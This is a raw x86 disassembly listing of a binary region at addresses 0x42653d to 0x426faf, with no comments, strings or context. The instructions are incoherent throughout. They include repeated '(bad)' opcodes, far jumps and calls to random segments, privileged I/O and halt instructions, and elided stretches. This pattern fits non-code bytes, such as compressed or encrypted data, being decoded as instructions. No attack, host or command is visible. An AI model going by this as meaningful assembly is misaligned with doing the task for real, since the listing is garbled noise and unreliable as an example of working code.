  42653d:	gs aas 
  42653f:	fstp   QWORD PTR [esi+0x62]
  426542:	jle    0x4265a1
  426544:	ja     0x4265b5
  426546:	call   0xd7e7dbb5
  42654b:	adc    DWORD PTR [edx],ebp
  42654d:	add    DWORD PTR [ebx+0x746a2cba],edx
  426553:	ret    0x8ffe
  426556:	gs stos DWORD PTR es:[edi],eax
  426558:	mov    eax,ds:0xc738261a
  42655d:	jne    0x426573
  42655f:	mov    eax,ds:0xfca40c19
  426564:	loopne 0x42658f
  426566:	ret    0x4a90
  426569:	(bad)  
  42656a:	je     0x42655d
  42656c:	ins    BYTE PTR es:[edi],dx
  42656d:	sbb    al,0x66
  42656f:	sub    al,0x2c
  426571:	fwait
  426572:	pusha  
  426573:	pusha  
  426574:	stc    
  426575:	jb     0x4265be
  426577:	jmp    0x42654b
  426579:	mov    ah,0xcb
  42657b:	mov    ss,WORD PTR [ecx]
  42657d:	sar    bh,0x30
  426580:	cmp    DWORD PTR [eax],esp
  426582:	pop    ebp
  426583:	sbb    BYTE PTR [ebx-0x41],ah
  426586:	lods   eax,DWORD PTR ds:[esi]
  426587:	dec    esi
  426588:	repz push es
  42658a:	mov    ch,al
  42658c:	dec    ebx
  42658d:	popf   
  42658e:	sub    ah,BYTE PTR [ebx+0x2f]
  426591:	aas    
  426592:	iret   
  426593:	jmp    0x4d7c:0xfde92ee3
  42659a:	ds mov edi,0x148d4071
  4265a0:	jbe    0x426584
  4265a2:	push   es
  4265a3:	xor    DWORD PTR [ebx+0x6adf4c14],ecx
  4265a9:	mov    al,ds:0xd357d500
  4265ae:	pop    esi
  4265af:	test   eax,0xdd668be0
  4265b4:	push   0xffffffb6
  4265b6:	push   es
  4265b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265b8:	xchg   DWORD PTR [ebp-0x5674c3ae],edi
  4265be:	(bad)  
  4265bf:	cmp    edi,ebx
  4265c1:	mov    al,0xa0
  4265c3:	std    
  4265c4:	push   esp
  4265c5:	push   ebp
  4265c6:	dec    esp
  4265c7:	popf   
  4265c8:	call   0x4771:0x2224a654
  4265cf:	push   cs
  4265d0:	mov    ch,0x93
  4265d2:	or     edx,DWORD PTR [edi+0x44]
  4265d5:	out    0xf,al
  4265d7:	popa   
  4265d8:	mov    BYTE PTR [eax+ebx*8],0x7f
  4265dc:	in     eax,0x52
  4265de:	and    dl,bh
  4265e0:	mov    ds:0xf399ddd8,ax
  4265e6:	cmc    
  4265e7:	ror    BYTE PTR [ecx],cl
  4265e9:	fadd   DWORD PTR [esi]
  4265eb:	shl    BYTE PTR [edi-0x46268c0],1
  4265f1:	dec    eax
  4265f2:	shl    BYTE PTR [ebx-0x7627632a],1
  4265f8:	push   ds
  4265f9:	mov    ebp,0x61b807e7
  4265fe:	and    ecx,DWORD PTR [edx-0x59]
  426601:	mov    ds:0x787c4d42,eax
  426606:	inc    eax
  426607:	mov    eax,0xb44de4f9
  42660c:	popa   
  42660d:	std    
  42660e:	cmp    bl,ch
	...
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x5e7d6da4]
  426682:	dec    esi
  426683:	pop    es
  426684:	lock cdq 
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	mov    eax,0xbc8e90e6
  426691:	xor    BYTE PTR [edi],ch
  426693:	pop    esi
  426694:	sar    eax,cl
  426696:	ds inc esp
  426698:	jno    0x426667
  42669a:	lods   al,BYTE PTR ds:[esi]
  42669b:	sbb    bh,BYTE PTR [eax+0x21]
  42669e:	test   DWORD PTR [eax],esi
  4266a0:	lods   eax,DWORD PTR ds:[esi]
  4266a1:	int    0x33
  4266a3:	mov    ebx,0xc185de94
  4266a8:	cmp    al,0x3d
  4266aa:	mov    eax,0x68f6eb1c
  4266af:	pop    eax
  4266b0:	dec    edx
  4266b1:	addr16 xor eax,0x2db8ca26
  4266b7:	sub    cl,BYTE PTR [edx+ecx*4-0x22]
  4266bb:	add    DWORD PTR [ebx],esi
  4266bd:	adc    eax,0xf22ead10
  4266c2:	ror    BYTE PTR [esi+0x7f98f444],1
  4266c8:	hlt    
  4266c9:	enter  0x3666,0xeb
  4266cd:	mov    dh,0xd0
  4266cf:	add    al,0x2
  4266d1:	ins    DWORD PTR es:[edi],dx
  4266d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266d3:	push   0x7d9a0553
  4266d8:	push   esp
  4266d9:	outs   dx,DWORD PTR ds:[esi]
  4266da:	dec    eax
  4266db:	push   cs
  4266dc:	fucomip st,st(4)
  4266de:	lods   eax,DWORD PTR ds:[esi]
  4266df:	sub    BYTE PTR [ecx],bh
  4266e1:	inc    esp
  4266e2:	sbb    eax,0xbae1400d
  4266e7:	add    eax,0x9ab9a2cb
  4266ec:	stc    
  4266ed:	adc    bl,cl
  4266ef:	arpl   WORD PTR [edi-0x3fc3fe02],si
  4266f5:	xchg   edi,eax
  4266f6:	sti    
  4266f7:	sub    ecx,DWORD PTR [ebp+0x67]
  4266fa:	mov    ch,0xe1
  4266fc:	dec    edx
  4266fd:	nop
  4266fe:	jl     0x426693
  426700:	das    
  426701:	sbb    al,BYTE PTR [eax]
  426703:	push   cs
  426704:	pushf  
  426705:	cmp    al,BYTE PTR [esi]
  426707:	pop    ss
  426708:	ds pop eax
  42670a:	lahf   
  42670b:	adc    edi,DWORD PTR [ecx+0x7b9a5e18]
  426711:	xchg   edi,eax
  426712:	iret   
  426713:	push   ss
  426714:	cdq    
  426715:	pop    edi
  426716:	jecxz  0x426716
  426718:	sbb    ebx,DWORD PTR [esi]
  42671a:	or     edx,0xffffffca
  42671d:	xchg   BYTE PTR [edi-0x43],dl
  426720:	push   cs
  426721:	imul   edx,DWORD PTR [edi-0x187d9857],0xfffffffe
  426728:	mov    ds:0x67d9de6a,al
  42672d:	dec    ebp
  42672e:	jb     0x426787
  426730:	pop    esp
  426731:	out    0x58,eax
  426733:	mov    BYTE PTR [edx-0x2a],dh
  426736:	dec    edi
  426737:	push   ds
  426738:	jb     0x42672b
  42673a:	and    al,0xc4
  42673c:	stos   BYTE PTR es:[edi],al
  42673d:	add    al,0x38
  42673f:	mov    ebx,0x77a447e
  426744:	loope  0x426723
  426746:	dec    eax
  426747:	(bad)  
  426748:	retf   
  426749:	inc    esp
  42674a:	lea    eax,[ebx]
  42674c:	sbb    BYTE PTR [ecx-0x758b21a9],0x4a
  426753:	retf   0x7ec0
  426756:	inc    esi
  426757:	push   ebp
  426758:	and    DWORD PTR [edx+0x70],ebp
  42675b:	(bad)  
  42675c:	ins    BYTE PTR es:[edi],dx
  42675d:	or     al,0xdf
  42675f:	mov    dh,0x15
  426761:	jbe    0x426789
  426763:	jp     0x4267db
  426765:	sbb    BYTE PTR [edx],cl
  426767:	ja     0x426713
  426769:	xchg   edx,eax
  42676a:	shl    DWORD PTR [esi-0x18a0a068],1
  426770:	or     esp,DWORD PTR [eax-0x73]
  426773:	call   0x4169fb6
  426778:	dec    edx
  426779:	out    dx,eax
  42677a:	mov    cl,0x1a
  42677c:	sub    BYTE PTR [ecx-0x6a],dh
  42677f:	ins    DWORD PTR es:[edi],dx
  426780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426781:	pop    ss
  426782:	gs mov dh,0xa
  426785:	test   DWORD PTR [ecx-0x53],esp
  426788:	fcmovnb st,st(6)
  42678a:	mov    cl,0x7a
  42678c:	xchg   edi,eax
  42678d:	xchg   ecx,eax
  42678e:	adc    eax,0x73
	...
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	pop    esp
  426801:	rol    DWORD PTR [ecx+0x19af4a4],0x0
  426808:	add    al,0x1
  42680a:	add    BYTE PTR [eax],al
  42680c:	push   0xf4161f68
  426811:	mov    bl,0x2
  426813:	lods   al,BYTE PTR ds:[esi]
  426814:	cwde   
  426815:	sahf   
  426816:	shl    BYTE PTR [ebx],cl
  426818:	sub    al,0x1
  42681a:	popa   
  42681b:	adc    eax,0x42adb41b
  426820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426821:	pushf  
  426822:	cmp    al,BYTE PTR [edi+0x16cae551]
  426828:	mov    ds:0x58f666c,al
  42682d:	dec    esp
  42682e:	pop    edi
  42682f:	loope  0x4267f6
  426831:	in     eax,dx
  426832:	test   esi,esi
  426834:	test   eax,0xd192b606
  426839:	int3   
  42683a:	cmp    edx,DWORD PTR [esp+edi*4-0x24]
  42683e:	in     eax,dx
  42683f:	sbb    ebx,esp
  426841:	push   es
  426842:	fdiv   DWORD PTR [ebx+0x6e05fc00]
  426848:	mov    dl,0xce
  42684a:	jmp    0x4268b2
  42684c:	push   ebp
  42684d:	(bad)  
  42684f:	addr16 test eax,0xf365a46
  426855:	ins    BYTE PTR es:[edi],dx
  426856:	scas   al,BYTE PTR es:[edi]
  426857:	scas   al,BYTE PTR es:[edi]
  426858:	xlat   BYTE PTR ds:[ebx]
  426859:	cld    
  42685a:	js     0x4268a5
  42685c:	mov    eax,0xf18f940c
  426861:	xor    bh,al
  426863:	fidiv  DWORD PTR [edx-0x5c20ee1a]
  426869:	fcmovnu st,st(4)
  42686b:	jp     0x42680a
  42686d:	adc    al,0xaa
  42686f:	and    bl,ch
  426871:	push   0x43
  426873:	mov    bl,0xb8
  426875:	fisttp DWORD PTR [edx+edi*2+0x16]
  426879:	and    dl,BYTE PTR [ecx-0x67]
  42687c:	jae    0x42682b
  42687e:	test   eax,0xeccba6be
  426883:	stos   BYTE PTR es:[edi],al
  426884:	push   ebx
  426885:	sub    al,0xc9
  426887:	mov    esi,0xb3256c4a
  42688c:	sub    ah,ah
  42688e:	shl    cl,0x64
  426891:	add    al,0x62
  426893:	outs   dx,DWORD PTR ds:[esi]
  426894:	fdivr  DWORD PTR [ecx+0x77]
  426897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426898:	dec    esp
  426899:	pop    edx
  42689a:	adc    edi,DWORD PTR [esp+esi*1+0x67]
  42689e:	ja     0x426901
  4268a0:	xchg   DWORD PTR [ecx+0x26],esi
  4268a3:	push   ecx
  4268a4:	rcr    BYTE PTR [esi],cl
  4268a6:	into   
  4268a7:	or     dh,dl
  4268a9:	push   es
  4268aa:	mov    edx,0x586b5fe5
  4268af:	arpl   WORD PTR [esi+0x13],di
  4268b2:	jns    0x42685d
  4268b4:	push   eax
  4268b5:	mov    ebx,DWORD PTR [edi]
  4268b7:	cmp    al,BYTE PTR [eax-0x7]
  4268ba:	and    eax,0xda69cfcd
  4268bf:	mov    edx,0x7bba5eb2
  4268c4:	arpl   WORD PTR [eax+ecx*8-0x7ea6f34c],sp
  4268cb:	pop    esp
  4268cc:	jno    0x4268f3
  4268ce:	xor    ch,BYTE PTR [esi]
  4268d0:	rcr    BYTE PTR [ebx+0x1e],1
  4268d3:	mov    ebx,0xb031ee73
  4268d8:	pop    esp
  4268d9:	mov    dl,0x78
  4268db:	push   eax
  4268dc:	jge    0x426947
  4268de:	mov    ebx,0xc1c1c164
  4268e3:	cmp    esi,0x8ec676c8
  4268e9:	dec    edx
  4268ea:	out    0x84,eax
  4268ec:	sar    esp,cl
  4268ee:	out    0x87,al
  4268f0:	pop    eax
  4268f1:	ins    BYTE PTR es:[edi],dx
  4268f2:	cwde   
  4268f3:	jge    0x426889
  4268f5:	xchg   esp,eax
  4268f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268f7:	enter  0x9eca,0x4f
  4268fb:	inc    ebx
  4268fc:	mov    DWORD PTR [esi-0x6],esi
  4268ff:	int    0x96
  426901:	push   edx
  426902:	jns    0x42695b
  426904:	inc    ecx
  426905:	ins    DWORD PTR es:[edi],dx
  426906:	mov    dl,bl
  426908:	or     edx,ebx
  42690a:	mov    edi,0x10d72589
  42690f:	mov    es,WORD PTR [eax]
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    esp,DWORD PTR [edx-0x7769435]
  426985:	fwait
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	(bad)  
  42698d:	int    0xc9
  42698f:	dec    esp
  426990:	mov    ebp,0x4ff68769
  426995:	pop    ds
  426996:	mov    dl,0x46
  426998:	sub    al,0xc7
  42699a:	sbb    eax,0x82d82a15
  42699f:	lods   al,BYTE PTR ds:[esi]
  4269a0:	cmp    edi,DWORD PTR [ebx]
  4269a2:	mul    DWORD PTR [ebx]
  4269a4:	leave  
  4269a5:	sbb    bh,BYTE PTR [ebp-0x6a19de1c]
  4269ab:	icebp  
  4269ac:	jns    0x4269f1
  4269ae:	jno    0x42693f
  4269b0:	jo     0x426975
  4269b2:	popf   
  4269b3:	cmp    DWORD PTR [edi-0x31],esp
  4269b6:	add    DWORD PTR [esi+0xd],edx
  4269b9:	mov    al,ds:0x1ad415f
  4269be:	sbb    al,0x87
  4269c0:	jnp    0x4269a3
  4269c2:	or     eax,0x474b43d
  4269c7:	push   edi
  4269c8:	cdq    
  4269c9:	out    dx,eax
  4269ca:	pop    es
  4269cb:	xchg   edx,eax
  4269cc:	adc    DWORD PTR [edx-0x35],0x30fcfc24
  4269d3:	pushf  
  4269d4:	add    DWORD PTR [eax-0x55],edx
  4269d7:	adc    ebp,DWORD PTR [edi]
  4269d9:	stc    
  4269da:	push   ecx
  4269db:	div    DWORD PTR [esi+0x42fc8802]
  4269e1:	add    eax,0x8e4fce7f
  4269e6:	lods   al,BYTE PTR ds:[esi]
  4269e7:	retf   
  4269e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269e9:	dec    ebp
  4269ea:	in     al,dx
  4269eb:	sbb    eax,0xb7ec863d
  4269f0:	pop    ebx
  4269f1:	sub    BYTE PTR [edx],ah
  4269f3:	retf   0x89b
  4269f6:	je     0x426a69
  4269f8:	ret    0xe036
  4269fb:	pusha  
  4269fc:	mov    BYTE PTR [edx-0x1c],0x83
  426a00:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  426a02:	adc    eax,0xb0bfb7a4
  426a07:	mov    esi,0xd3958cfe
  426a0c:	adc    eax,0xcc3d312
  426a11:	or     BYTE PTR ds:0x1f5930b3,al
  426a17:	pusha  
  426a18:	mov    WORD PTR [ebx+0x2],?
  426a1b:	cmp    eax,0x44f850bc
  426a20:	imul   bl
  426a22:	ret    
  426a23:	fsub   QWORD PTR [eax+0x55844983]
  426a29:	jb     0x426a65
  426a2b:	sbb    eax,0xe1cff2cb
  426a30:	iret   
  426a31:	(bad)  
  426a32:	std    
  426a33:	stc    
  426a34:	push   cs
  426a35:	add    bl,bl
  426a37:	add    al,0x9e
  426a39:	inc    edi
  426a3a:	adc    dh,ch
  426a3c:	aas    
  426a3d:	mov    eax,ds:0x3716be11
  426a42:	outs   dx,DWORD PTR ds:[esi]
  426a43:	dec    esi
  426a44:	pop    ecx
  426a45:	pop    es
  426a46:	jbe    0x426ab8
  426a48:	rcr    DWORD PTR [ebx+0x557b8fb0],cl
  426a4e:	xor    esi,ebx
  426a50:	in     eax,0x5d
  426a52:	push   esp
  426a53:	xchg   ebx,eax
  426a54:	loope  0x426a63
  426a56:	mov    ah,0x67
  426a58:	mov    ah,0x1f
  426a5a:	jbe    0x426a67
  426a5c:	rcl    BYTE PTR [eax],0xde
  426a5f:	mov    ds:0xbd84781d,al
  426a64:	push   ds
  426a65:	int3   
  426a66:	pop    edx
  426a67:	sar    BYTE PTR [ecx],cl
  426a69:	push   esi
  426a6a:	sti    
  426a6b:	loop   0x426a04
  426a6d:	pop    es
  426a6e:	inc    edi
  426a6f:	mov    dl,0x65
  426a71:	fcom   DWORD PTR [esi+0x60d14a58]
  426a77:	cld    
  426a78:	or     ebx,DWORD PTR [ebx+0x3e]
  426a7b:	and    BYTE PTR [esi-0x61aed660],ah
  426a81:	js     0x426a64
  426a83:	loop   0x426af5
  426a85:	xchg   esi,eax
  426a86:	(bad)  
  426a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a88:	dec    esi
  426a89:	sar    DWORD PTR [ebp+edi*2+0x65],0xfb
  426a8e:	xchg   edx,eax
  426a8f:	enter  0x0,0x0
	...
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x1
  426b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b02:	xchg   esi,eax
  426b03:	push   0x19cfc
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	lods   eax,DWORD PTR ds:[esi]
  426b0d:	adc    DWORD PTR [eax-0x49],edx
  426b10:	aam    0xdf
  426b12:	in     eax,dx
  426b13:	fimul  DWORD PTR [edi+0x4]
  426b16:	or     BYTE PTR [ebp-0x64],dh
  426b19:	ret    0xc43f
  426b1c:	fcom   QWORD PTR [edi-0x1e]
  426b1f:	adc    DWORD PTR [edx+0x14147c8b],eax
  426b25:	call   0xcde9:0xe5ad4aa1
  426b2c:	xchg   edx,eax
  426b2d:	iret   
  426b2e:	in     al,dx
  426b2f:	pop    ebx
  426b30:	shr    DWORD PTR ss:[ecx+0x7018d11b],0xe6
  426b38:	fistp  DWORD PTR [edi]
  426b3a:	and    eax,0xc9dbbf2e
  426b3f:	sub    BYTE PTR [eax],ch
  426b41:	gs inc esp
  426b43:	mov    edx,0x9871a9aa
  426b48:	cdq    
  426b49:	and    eax,0xf6ef767b
  426b4e:	pop    ds
  426b4f:	add    eax,DWORD PTR [esi-0x68544c3d]
  426b55:	xor    cl,BYTE PTR [eax+ecx*4+0xb067de6]
  426b5c:	jp     0x426af1
  426b5e:	push   esi
  426b5f:	jmp    0x5be9b874
  426b64:	dec    eax
  426b65:	push   ds
  426b66:	cmc    
  426b67:	mov    edi,0x1782a2e3
  426b6c:	aam    0x90
  426b6e:	mov    ah,0x62
  426b70:	xchg   BYTE PTR [esi-0x7],ah
  426b73:	rol    DWORD PTR [edi],cl
  426b75:	cmp    al,0x61
  426b77:	int3   
  426b78:	cli    
  426b79:	add    eax,0x66ce580d
  426b7e:	inc    esi
  426b7f:	xor    BYTE PTR [esp+ebx*4+0x31],ah
  426b83:	dec    esi
  426b84:	dec    edi
  426b85:	sub    DWORD PTR [ebp-0x10405f2d],esi
  426b8b:	into   
  426b8c:	push   ebx
  426b8d:	sbb    esi,ebx
  426b8f:	xchg   esp,eax
  426b90:	out    0xf5,eax
  426b92:	xor    al,0x0
  426b94:	mov    al,0x5f
  426b96:	add    bh,BYTE PTR [esi-0x24]
  426b99:	pop    ebx
  426b9a:	shr    ah,0x61
  426b9d:	push   ecx
  426b9e:	mov    cl,0x2f
  426ba0:	or     al,0x72
  426ba2:	xor    DWORD PTR [edi-0x62],ecx
  426ba5:	inc    ecx
  426ba6:	xor    DWORD PTR [ebx],edi
  426ba8:	dec    ebx
  426ba9:	pop    es
  426baa:	call   FWORD PTR [ecx]
  426bac:	sub    ebp,DWORD PTR [eax+0x520de679]
  426bb2:	sbb    eax,0x2ae1e670
  426bb7:	mov    bl,0xff
  426bb9:	repnz dec esp
  426bbb:	enter  0xd3ab,0xc5
  426bbf:	(bad)  
  426bc0:	fwait
  426bc1:	inc    esi
  426bc2:	mov    ds:0xccd86f73,eax
  426bc7:	add    dh,ch
  426bc9:	jmp    0x2b9f02fc
  426bce:	or     eax,0xcc14357a
  426bd3:	stc    
  426bd4:	lock (bad) 
  426bd6:	fnstenv [ecx*2-0x34963d7]
  426bdd:	mov    ecx,0x17485ea4
  426be2:	inc    esp
  426be3:	xor    esi,DWORD PTR [eax]
  426be5:	add    DWORD PTR [eax],0x4467b519
  426beb:	xchg   DWORD PTR [eax-0x2f8a349e],ebp
  426bf1:	jb     0x426c4b
  426bf3:	inc    esp
  426bf4:	sbb    BYTE PTR [edx-0x3ca8af73],bl
  426bfa:	jecxz  0x426c64
  426bfc:	retf   0x6200
  426bff:	fistp  QWORD PTR [edx-0x2290e86d]
  426c05:	push   esi
  426c06:	cmp    DWORD PTR [edx+0x3a1d3515],ebp
  426c0c:	adc    eax,0xe67119
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xd7a60e5
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	stos   BYTE PTR es:[edi],al
  426c8d:	imul   ecx,DWORD PTR ss:[eax+0x5a33b52a],0x99ef509b
  426c98:	adc    DWORD PTR [eax-0x15],esp
  426c9b:	inc    ebx
  426c9c:	outs   dx,BYTE PTR ds:[esi]
  426c9d:	add    al,dh
  426c9f:	jg     0x426c44
  426ca1:	sbb    al,cl
  426ca3:	les    esp,FWORD PTR [edx+0x4c]
  426ca6:	lea    esp,[eax]
  426ca8:	loopne 0x426c59
  426caa:	cdq    
  426cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cac:	fsub   st(0),st
  426cae:	xor    DWORD PTR [ebp-0x3d],ecx
  426cb1:	rol    bl,1
  426cb3:	jns    0x426ca5
  426cb5:	pop    ebp
  426cb6:	je     0x426c75
  426cb8:	mov    ecx,0xf7095f4f
  426cbd:	sbb    al,0xf4
  426cbf:	cmp    al,0x23
  426cc1:	or     eax,0xd6814d57
  426cc6:	inc    ecx
  426cc7:	xchg   esp,eax
  426cc8:	je     0x426c57
  426cca:	jl     0x426cac
  426ccc:	aam    0xbe
  426cce:	pop    ss
  426ccf:	es inc ebp
  426cd1:	fstp   TBYTE PTR [eax+edi*4+0x316d786a]
  426cd8:	mov    bh,0xfa
  426cda:	and    eax,0x1ba7999d
  426cdf:	outs   dx,DWORD PTR es:[esi]
  426ce1:	sbb    cl,dh
  426ce3:	push   0xf003e7f7
  426ce8:	jmp    0x98e5:0x20e020fa
  426cef:	mov    esi,DWORD PTR [eax]
  426cf1:	nop
  426cf2:	leave  
  426cf3:	xor    DWORD PTR [ebp-0xf34dcff],esi
  426cf9:	outs   dx,BYTE PTR ds:[esi]
  426cfb:	sbb    BYTE PTR [edx-0x1],ch
  426cfe:	adc    al,0x42
  426d00:	fild   WORD PTR [ecx-0x7]
  426d03:	fwait
  426d04:	div    BYTE PTR [ebp+0x7]
  426d07:	mov    eax,0x5f621e9f
  426d0c:	mov    ds:0x2b731d3f,al
  426d11:	jbe    0x426ccd
  426d13:	loop   0x426d82
  426d15:	mov    dh,0xb5
  426d17:	(bad)  
  426d18:	data16 or al,0x1
  426d1b:	add    eax,0x71a530c7
  426d20:	xor    BYTE PTR [edi+0x79],bl
  426d23:	aam    0x46
  426d25:	jl     0x426cc5
  426d27:	dec    ecx
  426d28:	pusha  
  426d29:	out    dx,al
  426d2a:	and    ebp,esp
  426d2c:	es push edx
  426d2e:	mov    ecx,DWORD PTR [edx-0x30]
  426d31:	add    DWORD PTR [ebp+0x2f0bd8ba],edi
  426d37:	sbb    eax,0xc1cfbd84
  426d3c:	or     ebx,DWORD PTR [ecx+0x3385bc40]
  426d42:	ret    
  426d43:	sub    eax,DWORD PTR [eax+0x10]
  426d46:	fstp   DWORD PTR [ebp+0x1a]
  426d49:	es test eax,0xe68dd2e4
  426d4f:	pop    esi
  426d50:	fidivr DWORD PTR [esp+ecx*2-0x50]
  426d54:	aad    0x50
  426d56:	icebp  
  426d57:	mov    gs,ecx
  426d59:	sbb    al,0xc
  426d5b:	fnstsw WORD PTR [esi+edx*2]
  426d5e:	jnp    0x426ce8
  426d60:	adc    edi,DWORD PTR [esi-0x48a1c641]
  426d66:	mov    ebp,0x5df415fa
  426d6b:	push   ebp
  426d6d:	popa   
  426d6e:	or     DWORD PTR [ebp-0x2f],ecx
  426d71:	jae    0x426d6a
  426d73:	stos   BYTE PTR es:[edi],al
  426d74:	xor    ah,BYTE PTR [ebx-0x69]
  426d77:	push   ss
  426d78:	sbb    BYTE PTR [ebp+0x2c],bh
  426d7b:	test   eax,0x4638ab48
  426d80:	das    
  426d81:	mov    BYTE PTR [ecx-0xa6ed1c9],ah
  426d87:	pop    edx
  426d88:	adc    al,0x27
  426d8a:	xor    edx,edi
  426d8c:	xor    ah,BYTE PTR [edx*4+0xf6]
	...
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0x790c:0xc7c2ecf9
  426e01:	pop    ds
  426e02:	(bad)  
  426e03:	into   
  426e04:	add    al,0x9f
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	out    dx,eax
  426e0d:	xchg   edx,eax
  426e0e:	mov    ?,WORD PTR [ebp-0x13c8bec5]
  426e14:	dec    esp
  426e15:	or     eax,0x47885e91
  426e1a:	pop    edi
  426e1b:	xor    eax,0x5cdf8449
  426e20:	push   esp
  426e21:	mov    edi,0xbee94187
  426e26:	sahf   
  426e27:	xchg   ecx,eax
  426e28:	or     al,0x74
  426e2a:	adc    al,0x34
  426e2c:	inc    ecx
  426e2d:	loope  0x426ded
  426e2f:	and    cl,ah
  426e31:	out    dx,al
  426e32:	loope  0x426e21
  426e34:	repz or dh,ah
  426e37:	cmp    BYTE PTR [ebx-0x52],ch
  426e3a:	push   es
  426e3b:	sub    bh,BYTE PTR [edx-0x5]
  426e3e:	stc    
  426e3f:	and    eax,0xc6442922
  426e44:	gs ja  0x426e7a
  426e47:	cmp    bl,BYTE PTR [edi]
  426e49:	add    DWORD PTR [ebp+0x69],ecx
  426e4c:	adc    eax,0x1f038651
  426e51:	xor    esi,DWORD PTR [esi-0xf]
  426e54:	dec    esi
  426e55:	cli    
  426e56:	mov    eax,ds:0x7d08a6b8
  426e5b:	xchg   ecx,eax
  426e5c:	sbb    ebx,DWORD PTR [edi+0x3d9b327b]
  426e62:	dec    esi
  426e63:	cs mov ecx,0xf4d5b13d
  426e69:	adc    DWORD PTR [edi-0x5f9ced5e],edi
  426e6f:	rcl    al,cl
  426e71:	nop
  426e72:	ins    BYTE PTR es:[edi],dx
  426e73:	(bad)  
  426e74:	(bad)  
  426e76:	adc    ch,BYTE PTR [esi+0x38102613]
  426e7c:	mov    ebp,0x6ef78da0
  426e81:	aam    0xb7
  426e83:	mov    ch,0x29
  426e85:	lock stos BYTE PTR es:[edi],al
  426e87:	gs jnp 0x426ef4
  426e8a:	cwde   
  426e8b:	adc    BYTE PTR [ebp-0x4],dh
  426e8e:	fadd   DWORD PTR [ecx+0x6c]
  426e91:	sub    esi,eax
  426e93:	aam    0x92
  426e95:	(bad)  
  426e96:	push   ecx
  426e97:	(bad)  
  426e98:	xor    eax,0x4242251d
  426e9d:	ins    BYTE PTR es:[edi],dx
  426e9e:	sbb    bl,BYTE PTR ds:0x6dada809
  426ea4:	inc    esi
  426ea5:	popa   
  426ea6:	mov    ds:0x2157c9de,al
  426eab:	mov    esi,DWORD PTR [esi+esi*8-0x20]
  426eaf:	mov    ecx,0xfa1624f1
  426eb4:	rcr    BYTE PTR [esi+0x50],1
  426eb7:	fs addr16 and ecx,esi
  426ebb:	in     al,0x8b
  426ebd:	or     esp,DWORD PTR [edi+0x699e06fd]
  426ec3:	mov    edi,0x6f387956
  426ec8:	mov    edi,0xd958632e
  426ecd:	mov    esi,0x4ab15d53
  426ed2:	push   DWORD PTR [edx-0x75]
  426ed5:	push   ss
  426ed6:	jbe    0x426ea7
  426ed8:	adc    BYTE PTR [ebx],0x29
  426edb:	cmp    DWORD PTR [edi+0x46],esp
  426ede:	adc    esp,DWORD PTR ds:0x7c70b6db
  426ee4:	and    BYTE PTR [ecx],ch
  426ee6:	mov    bl,0x5
  426ee8:	nop
  426ee9:	push   ebx
  426eea:	push   edx
  426eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426eec:	lods   al,BYTE PTR ds:[esi]
  426eed:	cmp    eax,0x117823c8
  426ef2:	call   0x429b:0x9047c6a2
  426ef9:	xor    BYTE PTR [edx-0x1],dl
  426efc:	dec    eax
  426efd:	jg     0x426f69
  426eff:	repnz sub eax,0x11628bef
  426f05:	stos   DWORD PTR es:[edi],eax
  426f06:	dec    ebp
  426f07:	fwait
  426f08:	sub    edx,ebx
  426f0a:	into   
  426f0b:	xchg   BYTE PTR [edx+0xcd1f7f],ah
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esp+ecx*4+0x8079811],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	jb     0x426fab
  426f8e:	xchg   ecx,eax
  426f8f:	mov    cl,0x30
  426f91:	arpl   WORD PTR [ebp-0x4320bcde],bx
  426f97:	(bad)  
  426f98:	icebp  
  426f99:	scas   al,BYTE PTR es:[edi]
  426f9a:	jmp    0x7976:0xc73da050
  426fa1:	test   BYTE PTR [esi],ch
  426fa3:	mov    esp,0x18ff8852
  426fa8:	dec    eax
  426fa9:	and    ebp,DWORD PTR [eax-0x4d0eee3b]
  426faf:	xor    al,0x4b
